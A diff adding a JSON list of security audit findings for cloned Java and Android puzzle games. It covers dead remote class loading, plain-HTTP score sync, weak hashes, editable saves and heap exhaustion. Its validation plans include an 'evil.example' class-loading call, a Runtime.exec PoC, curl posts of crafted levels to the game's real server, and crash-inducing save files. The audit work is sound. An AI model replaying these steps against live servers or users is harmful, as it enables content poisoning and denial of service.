+    "attack_scenario": "Theoretical: if a future maintainer re-wires AI or level loading through ApoClassLoader.getMyClass() (as sibling variants do), any http(s) URL passed in applet mode yields silent remote code execution from that host; a network attacker could then serve hostile class bytes. As shipped, an attacker gains nothing from this file.",
+    "validation_plan": "Reproduce the absence: run an IDE call-hierarchy search for getMyClass() in this source root (returns only the declaration). Reproduce the capability: add a temporary main() calling new ApoClassLoader(\"http://127.0.0.1:8000/\",\"Evil\").getMyClass() with a class file served by python -m http.server and observe instantiation - demonstrating what one-line reuse in any sibling variant activates.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "Cloned ApoClassLoader instantiates classes from file:/http: URLs (defineClass-equivalent) - dead code in this variant",
+    "reachable": false,
+    "attack_scenario": "Not exploitable as shipped: no call site. Documented because the identical class IS reachable in sibling variants of the corpus; if a future clone re-attaches it, an attacker who controls the selected path/URL gains arbitrary native Java code execution under the user's account.",
+    "validation_plan": "Static proof of unreachability: `grep -rn ApoClassLoader _from_jar_ApoImp` matches only the class itself. Dynamic proof of dangerousness if ever called: place a class with a static initializer printing 'pwned' under a temp dir, construct new ApoClassLoader(tmpdir, 'Pwn').getMyClass() in a scratch main and observe execution.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoHelp.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-327",
+    "title": "MD5 helper and plaintext-HTTP highscore submission machinery present but unreferenced (dead cloned infra)",
+    "reachable": false,
+    "attack_scenario": "No scenario as shipped. If re-wired (clone propagation risk): a network attacker could forge scores (MD5-over-plaintext, no secret), spoof leaderboard contents served over HTTP, and crash clients with non-numeric lines.",
+    "validation_plan": "`grep -rn 'ApoHighscore\\|getMd5Digest\\|ApoGameCounter\\|AudioPlayer' _from_jar_ApoImp/apoImp` returns no matches - proving the sinks are inert in this clone while present in siblings; use for cross-variant diffing of where they become live.",
+    "line": 286,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "ApoIO.java",
+    "category": "insecure_custom_parser_infrastructure",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "ApoIO base class performs raw HTTP GET/POST level transfer in applet mode; no subclass in this variant",
+    "reachable": false,
+    "attack_scenario": "Theoretical here. This is exactly the infrastructure behind the corpus-wide '.mar/.skunk/get_level.php' pattern: in variants that subclass ApoIo, a malicious level server or HTTP MITM supplies truncated/hostile streams to hand-rolled parsers with no length/format validation. In ApoMarc no such parser exists, so there is nothing to attack.",
+    "validation_plan": "Orphan proof: `grep -rn \"extends ApoIO\" --include=*.java .` returns zero hits; instantiate an anonymous ApoIo in a harness and call readLevel(true,\"http://127.0.0.1:8000/x\") against netcat serving junk to confirm the transport opens before any parse - establishing that safety depends entirely on absent subclasses.",
+    "line": 83,
+    "clone_variants": 17,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "ApoHelp.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-328",
+    "title": "MD5 helper present in shared library but never invoked (orphaned weak-hash capability)",
+    "reachable": false,
+    "attack_scenario": "Theoretical: in variants that validate levels/highscores with this function, MD5 collisions allow crafting substitute artifacts with matching checksums. In ApoMarc the function is inert, so no attacker action applies.",
+    "validation_plan": "Run `grep -rn \"getMd5Digest\" --include=*.java .` - single hit at the definition. Cross-check sibling variants for callers to confirm the shared-component propagation hypothesis.",
+    "line": 275,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoIO.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Plain-HTTP level transfer infrastructure inherited from framework, but unreachable in this variant",
+    "reachable": false,
+    "attack_scenario": "If a future variant re-enables applet-mode saving, level bytes (and any URLs handed to writeLevel) would travel unencrypted over HTTP, allowing a network MITM to read/inject level submissions. Today an attacker gains nothing: there is no reachable call site.",
+    "validation_plan": "Static proof: grep confirms single occurrence of APPLET_LEVEL (definition only) and that all writeLevel/readLevel(URL) invocations in apoMario.* go through overrides forcing local files; runtime proof: run ApoMarioApplet in appletviewer and verify no socket to apo-games.de is opened (tcpdump/lsof) because all IO buttons are hidden/disabled.",
+    "line": 168,
+    "clone_variants": 17,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "ApoHelp.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Applet 'cookie' storage sends name/value pairs to codebase cookies.php over plain HTTP",
+    "reachable": false,
+    "attack_scenario": "MITM reads/modifies persisted game state ('cookies') in flight, or a malicious codebase harvests whatever name/value pairs are stored. Dead code here: no path constructs these calls.",
+    "validation_plan": "Harness: ApoHelp.saveData(new URL(\"http://127.0.0.1:8000/\"), \"progress\",\"level9\") while running `nc -l 8000`; observe ASCII 'SET=&name=progress&value=level9' in cleartext. Then grep to reconfirm zero production callers.",
+    "line": 424,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "ApoHelp.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-328",
+    "title": "MD5 helper for highscore/validation-style hashing (unused in this variant)",
+    "reachable": false,
+    "attack_scenario": "Where wired, a cheater generates colliding/crafted solution hashes to submit fake solves; network attacker forges hash+solution pairs since transport is also plaintext (see ApoPongBeat-02). Pure library function here.",
+    "validation_plan": "Unit test confirms MD5 output format (e.g. getMd5Digest(\"\") == known digest); grep confirms no call sites; mark as latent corpus-wide weakness rather than an active flaw in this build.",
+    "line": 303,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoHelp.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Level-progress sync to apo-games.de 'cookies.php' over plain HTTP; server response trusted for unlock state",
+    "reachable": true,
+    "attack_scenario": "Applet deployment only (B_APPLET=true is set solely in the ApoRelaxApplet constructor, apoRelax/ApoRelaxApplet.java:28). An on-path attacker (open Wi-Fi, ISP, compromised CDN/DNS for apo-games.de) intercepts the cleartext request to cookies.php and replies with an arbitrary integer, unlocking all levels; likewise they can suppress or forge the SET= progress upload. No authentication or TLS anywhere, and there is no user identity, so responses cannot even be bound to a player.",
+    "validation_plan": "Map www.apo-games.de to 127.0.0.1 in /etc/hosts, run a plain-HTTP listener logging requests. Launch the applet (or patch ApoConstants.B_APPLET=true before ApoRelaxPanel.init). Observer 1: plaintext request to /apoRelax/cookies.php containing body 'GET=&name=level' (proves no TLS/no integrity). Observer 2: reply with body '11' and confirm the level chooser renders buttons up to level 11 unlocked. Wireshark shows the entire exchange in cleartext.",
+    "line": 424,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoImage.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Editor parses arbitrary user-selected image file with ImageIO (extension-only filter, no size/format limits)",
+    "reachable": true,
+    "attack_scenario": "An attacker social-engineers a victim into opening a hostile 'puzzle picture': (a) a decompression-bomb PNG (e.g. 50000x50000) exhausts heap during decode, freezing/crashing the game; (b) on an unpatched JRE, malformed JPEG/PNG chunks targeting known ImageIO CVEs yield client-side code execution. Gain ranges from DoS to RCE depending on the victim's JVM - bounded by the fact that the user must hand-pick the file.",
+    "validation_plan": "Generate a 60000x60000 all-blue PNG (decompression bomb), press L in the editor and open it: heap climbs hundreds of MB and UI stalls BEFORE any downscale occurs (add a breakpoint/log at ApoImage.java:93 vs ApoRelaxLevelGeneration.getImage:495 to show the cap comes too late). For the parser angle, feed a PNG fuzzed with a known pre-2022 ImageIO CVE sample against a matching old JRE and observe the crash/exception inside ImageIO.read.",
+    "line": 93,
+    "clone_variants": 17,
+    "clone_distinct_versions": 10,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSkunkman",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "URLClassLoader-based ApoClassLoader supports loading classes from a remote URL (applet branch) but has no caller in this variant",
+    "reachable": false,
+    "attack_scenario": "Theoretical: if a future/sibling wiring passes an http:// path while running as applet (where the sandbox would normally be the only barrier), getMyClass() fetches and executes bytecode from that host over plaintext HTTP, enabling a network MITM to serve malicious classes. In this variant nothing reaches it.",
+    "validation_plan": "Verify absence: grep the whole tree for 'new ApoClassLoader' / 'getMyClass' - only the definition matches. To demonstrate the hazard if ever revived: host a jar with an ApoSkunkmanAI subclass on a local HTTP server, call new ApoClassLoader(\"http://127.0.0.1:8000/\",\"Evil\").getMyClass() with B_APPLET=true, watch tcpdump show plaintext GET and the constructor execute.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "URLClassLoader-based dynamic class instantiation helper present but unwired (theoretical remote/local class loading)",
+    "reachable": false,
+    "attack_scenario": "Theoretical only: were a future maintainer to call new ApoClassLoader(\"http://evil.example/\", \"Exploit\").getMyClass() with any server-influenced argument (e.g. a downloaded level metadata field), hosting a .class file whose constructor runs arbitrary code would achieve remote code execution in the game process. As shipped, no such caller exists, so an attacker gains nothing through this file alone.",
+    "validation_plan": "Confirm deadness: grep -rn 'ApoClassLoader' --include='*.java' . returns only its own definition (already done). To demonstrate the latent danger, compile a two-class PoC where a test harness invokes getMyClass() against a directory containing class Exploit{ public Exploit(){Runtime.getRuntime().exec(\"calc\");} } and observe execution - proving that any future call site with remote input becomes RCE.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "AudioPlayer.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "AudioPlayer contains plain-HTTP music fetch branch from apo-games.de, currently dead (BInJAR hardwired true)",
+    "reachable": false,
+    "attack_scenario": "Theoretical as written: were BInJAR flipped to false in a sibling variant running as applet, a MITM on the plain-HTTP connection substitutes an audio file; worst realistic case is malformed-input parser bugs in javax.sound (historically exploitable) plus trivially blockable playback. As shipped, no untrusted bytes reach AudioSystem at all.",
+    "validation_plan": "Verify deadness: `javap -c` or read line 19 showing 'final boolean BInJAR = true', and confirm the else-branch at lines 66-71 cannot execute. To prove the latent path, reflectively/set BInJAR=false, run in applet mode behind mitmproxy, serve garbage on the requested URL, and observe exceptions from AudioSystem.getAudioInputStream - confirming server-controlled bytes enter javax.sound.",
+    "line": 68,
+    "clone_variants": 11,
+    "clone_distinct_versions": 4,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "AudioPlayer.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Sound loader contains plain-HTTP fetch from apo-games.de behind a permanently-false flag",
+    "reachable": false,
+    "attack_scenario": "If the flag were flipped and applet-deployed, a MITM could serve malformed audio to the javax.sound parser seeking memory-corruption bugs, or track players. Currently impossible: javap shows the constant-folded branch; no network sound path exists.",
+    "validation_plan": "`javap -c org.apogames.sound.AudioPlayer | grep -A2 ldc` shows only the getResource path; run the desktop game under `lsof -i` and observe zero sockets during menu music playback.",
+    "line": 68,
+    "clone_variants": 11,
+    "clone_distinct_versions": 4,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoHighscore.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Any completed highscore response is treated as success and grants coins",
+    "reachable": true,
+    "attack_scenario": "A local cheater routes the hard-coded HTTP endpoint through a controlled proxy, clicks Upload after reaching the score screen, and answers the POST with `HTTP/1.1 200 OK` and an empty completed body. The response loop executes zero times, save returns true, and the client grants 50 spendable hint coins even though no score was stored.",
+    "validation_plan": "Intercept save_highscore.php with a local HTTP proxy, return status 200 with Content-Length 0, click Upload, and compare the displayed balance before and after. A 50-coin increase at ApoSimpleGame.java:977 confirms the finding.",
+    "line": 102,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoHighscore.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Unbounded parse of highscore response: malicious server can exhaust client heap",
+    "reachable": true,
+    "attack_scenario": "Attacker controlling the endpoint (or MITM with a slow-drip stream) answers a highscore fetch with gigabytes of '0\\n0\\nAAAA...' lines; the EDT-independent loader thread allocates until OutOfMemoryError. Gained: client freeze/crash during normal play; combined with finding 01 requires only network position.",
+    "validation_plan": "Stub server script streams '1\\n1\\nx\\n' repeated ~10^7 times slowly. Run game, open highscore screen, watch RSS/jconsole heap climb until OutOfMemoryError in ApoHighscore.load. Compare with a 10-entry response (flat memory).",
+    "line": 129,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "ApoHighscore.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Highscore level/username/solution submitted over plain HTTP - to the WRONG game's endpoints (apoNotSoSimple), never called in this variant",
+    "reachable": false,
+    "attack_scenario": "Network attacker (coffee-shop MITM or malicious DNS for apo-games.de) reads usernames/submitted solutions in transit and can serve crafted response lines that populate the game's highscore lists. Not exploitable in ApoPongBeat as shipped because save()/load() are unreachable dead clones.",
+    "validation_plan": "(1) Dormancy: grep shows no references. (2) Wire behavior: harness calls ApoHighscore.getInstance().load() with DNS pointed at a netcat listener; observe plaintext POST body 'Get=' and confirm the request goes to the apoNotSoSimple path despite running ApoPongBeat.",
+    "line": 118,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakePuzzleChooser.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Editable local solved counter unlocks all built-in levels",
+    "reachable": true,
+    "attack_scenario": "A local user with root, app-UID instrumentation, or equivalent access stops the app and changes solved in ApoSnakePref to 999. On restart, setSolved() clamps it to the final level rather than rejecting it, and the chooser permits every built-in level. The gain is local progression cheating only, not code execution or a server-side privilege.",
+    "validation_plan": "On a rooted test emulator, force-stop the app, locate its ApoSnakePref.xml under the app data directory, and set the solved integer to 999, or use app-UID instrumentation to write the same preference. Relaunch and open the puzzle chooser. Being able to select the final built-in level, while a clean profile permits only the initial level, confirms the trust path.",
+    "line": 84,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakeUserlevelsLoad.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-306",
+    "title": "Unauthenticated, unsigned level upload endpoint lets anyone publish content pushed to all players",
+    "reachable": true,
+    "attack_scenario": "An attacker scripts curl --data 'level=<crafted payload>' against save_level.php (endpoint discoverable from any APK string table; the obfuscated path segment 'apoSn4ke' provides no secrecy). Poisoned levels persist server-side and are served to the whole player base on next fetch, enabling the remote-crash scenario of ApoSnake-02 or mass garbage-content injection, with no attribution or revocation mechanism in the protocol.",
+    "validation_plan": "From a PC: curl -d 'level=ABxxxxxxxxxxxxxxxxxxxxxx' http://www.apo-games.de/apoSn4ke/save_level.php, then curl -d 'Get=' http://www.apo-games.de/apoSn4ke/get_level.php and grep for the submitted string. If the service is dead, reproduce locally by pointing ApoSnakeConstants.java:5-6 at a stub PHP/Flask pair implementing the same contract and replaying the flow from the app.",
+    "line": 133,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakePanel.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-345",
+    "title": "Level-progression flag stored as plain int in SharedPreferences; trivially editable to unlock all levels",
+    "reachable": true,
+    "attack_scenario": "A rooted user (or adb backup, since android:allowBackup is unset and defaults to permissive on relevant APIs) edits ApoSnakePref.xml to '<int name=\"solved\" value=\"99\" />'; on next launch all 29 built-in levels are selectable and marked solved. Purely a cheating vector - no code execution, affects only single-player progression.",
+    "validation_plan": "On a rooted emulator: adb root; adb shell 'echo \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\" standalone=\\\"yes\\\" ?><map><int name=\\\"solved\\\" value=\\\"28\\\" /></map>\" > /data/data/net.apogames.aposnake/shared_prefs/ApoSnakePref.xml'; relaunch the app and observe all level-chooser circles unlocked/green in the puzzle chooser screen.",
+    "line": 68,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockPanel.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-345",
+    "title": "Unlocked progression is trusted directly from local preferences",
+    "reachable": true,
+    "attack_scenario": "On a rooted or debuggable device, a player stops the app, changes the solved preference to 29, and restarts it. Level 30 becomes selectable without completing the preceding levels. The gain is confined to cheating progression on that installation and does not itself forge the online leaderboard.",
+    "validation_plan": "On a rooted or authorized debuggable emulator, stop net.apogames.apoclock, edit shared_prefs/ApoClockPref.xml so solved is 29, restart, and open the puzzle chooser. Confirm that the last built-in level is selectable before any earlier level is completed.",
+    "line": 119,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoBotGame.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-353",
+    "title": "Unsigned working-directory levels control win state and point calculation",
+    "reachable": true,
+    "attack_scenario": "A local user replaces levels/easy.bot with a valid one-level file containing a 1x1 ground=0 tile, start=(0,0), direction=2, and menu values 100,0,0. After choosing Game and pressing Go without entering commands, isLevelWin finds no GROUND_ORIGINAL tile and awards 2500 points: 1000 + 100*15. This cheats only the local displayed result.",
+    "validation_plan": "Write the twelve big-endian integers 1,1,1,0,0,0,0,2,3,100,0,0 as levels/easy.bot in the game's working directory. Launch the desktop game, choose Game, leave all command slots empty, and press Go. Immediate completion with 2500 displayed points confirms that unsigned level data controls scoring.",
+    "line": 156,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoCheating",
+    "file": "ApoCheatingGoal.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-807",
+    "title": "File-controlled goal and finish values can force an immediate local win",
+    "reachable": true,
+    "attack_scenario": "A local cheater creates a structurally valid 15-by-15 .cheat file with one player at (64,64), an overlapping goal whose plus is 100.0, and a matching finish point at the player's center. After loading and starting the level, the user presses the action key once. The goal sets progress to 100 and the next tick records a win. The gain is limited to the local victory/grade and Next UI rendered at _from_jar_ApoCheating/apoCheating/ApoCheatingGamePanel.java:854-949; no server-side score or account impact exists in the reviewed source.",
+    "validation_plan": "Generate a valid .cheat stream containing a 15-by-15 grid, zero teachers, one player at (64,64) with ID 1, one overlapping goal with plus 100.0, zero extras, and one finish at (75,75) for player 1. Load it, start play, and press Space once. A win overlay and grade on the following game tick confirm the trusted-local-state bypass.",
+    "line": 71,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcejump",
+    "file": "ApoIcejumpNetwork.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Unbounded HTTP response line can exhaust the game heap",
+    "reachable": true,
+    "attack_scenario": "After the victim enters Networkmode, the attacker answers the HTTP request with a continuous, very large sequence of bytes containing no CR or LF. readLine continues growing its in-memory line buffer until the lookup thread or JVM encounters OutOfMemoryError, denying or destabilizing the game process.",
+    "validation_plan": "Run the packaged game with a small test heap such as -Xmx64m and a controlled HTTP proxy. Configure the proxy to stream bytes indefinitely without a newline for the hard-coded URL, press N, and observe an OutOfMemoryError in the lookup thread, process termination on an exit-on-OOM JVM, or loss of responsiveness. Repeat with a bounded newline-terminated response as the control case.",
+    "line": 72,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoRelaxPanel.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Applet progress can be forged over plain HTTP",
+    "reachable": true,
+    "attack_scenario": "An on-path attacker intercepts the cleartext cookies.php request and returns the single line \"11\". The client parses it and displays all twelve built-in levels as unlocked, modifying the victim's progression without solving them. The same cleartext channel is used to save progress at ApoRelaxPanel.java:208-218.",
+    "validation_plan": "Run the applet through a legacy JRE with an intercepting proxy. Return HTTP 200 and body \"11\\n\" for /apoRelax/cookies.php. Open the level chooser and confirm that levels 1-12 are drawn as unlocked. Capturing the request also confirms that no TLS protects the response.",
+    "line": 93,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoRelaxLevelChooser.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Locked levels remain clickable while hidden",
+    "reachable": true,
+    "attack_scenario": "On a fresh game where only level 1 is drawn, a local user clicks the blank coordinate occupied by a hidden later-level button. The unchecked handler starts that locked level, bypassing progression without editing memory, files, or network traffic.",
+    "validation_plan": "Start with maxLevel 0 and open the chooser. Click approximately (537,362), the center of button index 11 derived from ApoRelaxLevelChooser.java:48-59. Confirm that setGame(11) starts level 12 even though only level 1 was rendered.",
+    "line": 147,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoLevelIO.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Local levels file supplies an unchecked negative button index",
+    "reachable": true,
+    "attack_scenario": "A malicious local file contains three big-endian integers: count 1, level 0, stars 3. Parsing succeeds, but entering the level chooser evaluates buttons.get(-1), throwing IndexOutOfBoundsException on the uncaught game loop. In-range fabricated records can likewise mark levels visible at ApoSimpleLevelChooser.java:137-140.",
+    "validation_plan": "Create a 12-byte `levels` file containing `00 00 00 01 00 00 00 00 00 00 00 03`, start the game, and enter Puzzle then Level Chooser. Confirm IndexOutOfBoundsException from ApoSimpleLevelChooser.java:139 and termination of the ApoSubGame thread.",
+    "line": 43,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoSlitherLinkLevelIO.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-345",
+    "title": "Editable save file can mark built-in puzzles solved without verification",
+    "reachable": true,
+    "attack_scenario": "A local user writes one record containing the built-in level string from ApoSlitherLinkLevels.java:24 and the syntactically valid but empty-edge solution \"0404aaaaaaaaaaaaaaaa\"; \"a\" denotes an empty cell at ApoSlitherLinkLevelsHelp.java:13. On restart, the game marks that Easy puzzle solved and increments the displayed completion count without the user solving it.",
+    "validation_plan": "Use DataOutputStream to create highscore.apo with writeInt(1), writeUTF(\"0404  32 3     2 0 0\"), and writeUTF(\"0404aaaaaaaaaaaaaaaa\"). Launch from that directory and confirm the Easy completion counter is incremented and the first level is shown as solved despite the empty loop.",
+    "line": 32,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoSlitherLinkLevelIO.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Unbounded save count amplifies into retained preview images",
+    "reachable": true,
+    "attack_scenario": "A local attacker supplies a small save containing thousands of repeated custom records such as level \"0101 \" and solution \"0101a\". Duplicates are not filtered in addCustomsLevels at lines 43-49, and each retained helper receives a 200-by-200 ARGB preview at ApoSlitherLinkLevelsHelp.java:10-11 and 254-264. The amplified allocations exhaust the heap before the menu appears.",
+    "validation_plan": "Generate highscore.apo with writeInt(1000), followed by 1000 pairs of writeUTF(\"0101 \") and writeUTF(\"0101a\"). Run with -Xmx64m. Confirm OutOfMemoryError during ApoSlitherLinkLevelsHelp.makeSolvedImage or failure to reach the main menu.",
+    "line": 72,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoStarz",
+    "file": "ApoStarzHighscore.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Zero-record highscore file crashes game initialization",
+    "reachable": true,
+    "attack_scenario": "A local attacker replaces levels/highscore.hig with four zero bytes, or a malicious server/network attacker returns those bytes to the applet. On the next launch, the parser accepts a record count of zero. Menu initialization immediately requests a random level and throws IndexOutOfBoundsException, preventing normal startup.",
+    "validation_plan": "Back up highscore.hig, replace it with bytes 00 00 00 00, and launch ApoStarzMain from the directory containing levels. Confirm initialization terminates with IndexOutOfBoundsException from ApoStarzHighscore.getRandomLevel() line 104. Repeat in applet mode by serving the same four-byte response.",
+    "line": 99,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoStarz",
+    "file": "ApoStarzHighscore.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-353",
+    "title": "Writable local highscore records have no integrity check",
+    "reachable": true,
+    "attack_scenario": "A local player copies a valid level code from an .ase file and constructs highscore.hig with one DataOutputStream record containing that code, an artificial score such as 1, and a non-empty solution. On launch, the game accepts and displays the fabricated record as its highscore. This affects only the local game; the source does not establish that the desktop value reaches a shared server.",
+    "validation_plan": "Use a small Java helper with DataOutputStream to write: int 1, writeUTF(valid level code), int 1, and writeUTF(\"r\"). Place the result at levels/highscore.hig, launch the desktop game, select the matching level, and confirm Highscore: 1 and the injected solution are shown.",
+    "line": 143,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "TutorVolley",
+    "file": "TutorVolleyClassLoader.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-789",
+    "title": "AI class-file length directly controls heap allocation",
+    "reachable": true,
+    "attack_scenario": "An attacker supplies an oversized player/Human.class, such as a 256 MiB file, as purported AI content. Launching the game automatically attempts an equally large contiguous heap allocation before displaying the window. With a smaller maximum heap this throws OutOfMemoryError, which is swallowed by the catch(Throwable) at TutorVolleyClassLoader.java:75-77 and presented as ClassNotFoundException; with a larger heap it causes substantial allocation and file reading before class validation. Player one remains without an AI, and TutorVolleyPlayer.java:194-195 prevents normal play.",
